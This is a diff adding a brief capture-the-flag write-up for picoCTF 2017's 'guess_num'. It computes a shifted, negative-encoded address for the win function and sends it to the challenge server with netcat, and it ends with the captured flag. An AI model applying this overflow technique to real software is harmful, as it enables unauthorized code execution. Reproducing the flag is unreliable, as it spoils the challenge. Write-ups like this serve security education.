@@ -1,0 +1,17 @@
+1- look up the address of the win function using "nm -a guess_num" :
+0x0804852b
+
+2- transform it into binary :
+1000 0000 0100 1000 0101 0010 1011
+
+3- shift it by four and notice it is too big for a signed positive 32 bit number...
+1000 0000 0100 1000 0101 0010 1011 0000
+
+4- transform it into a negative decimal number:
+-2142743888
+
+5- deliver the payload to get the flag:
+echo "-2142743888" > payload
+cat payload - | nc shell2017.picoctf.com 20545
+
+flag : 181db5615729e295ea7a5d5773c3829b
